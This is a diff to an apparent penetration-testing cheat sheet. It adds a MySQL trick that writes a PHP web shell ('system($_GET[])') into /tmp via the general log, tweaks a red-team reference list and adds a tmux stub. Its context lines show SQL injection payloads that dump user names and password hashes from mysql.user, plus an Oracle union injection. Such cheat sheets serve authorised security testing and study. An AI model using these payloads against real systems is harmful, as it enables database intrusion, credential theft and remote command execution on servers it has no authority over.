@@ -481,6 +481,10 @@ $ 9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user
 [WHERE]
 $ ' and password like 'k%'--
 
+=> Write File
+$ Set Global General_Log_File = '/tmp/test.php';
+$ Select '<?php system($_GET[]); ?>';
+
 [ORACLE]
 => Get Current Database
 $ union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
@@ -1364,6 +1368,9 @@ $ ntpdate 10.10.10.10.10
 => net
 $ net time set -S 10.10.10.10
 
+=> Conversion
+echo $((0x9f))
+
 => Remove From sudo group
 $ sudo deluser username sudo
 ```
@@ -1600,12 +1607,13 @@ $ neo4j:neo4j
 ### Red Team References
 
 ```bash
-# References
-https://www.vincentyiu.com/red-team-tips
-https://vysecurity.rocks/
-https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
-http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
-https://www.exploit-db.com/docs/48282
+=> References
+$ https://www.vincentyiu.com/red-team-tips
+$ https://vysecurity.rocks/
+$ https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
+$ http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
+$ https://www.exploit-db.com/docs/48282
+$ https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/
 ```
 
 ### Rubeus
@@ -2797,6 +2805,15 @@ getmyuid
 - https://stackoverflow.com/questions/3115559/exploitable-php-functions
 - https://wiki.x10sec.org/web/php/php/
 
+```
+
+### Tmux
+
+```bash
+# Commands
+
+# References
+https://tmuxcheatsheet.com/
 ```
 
 ### Firebird
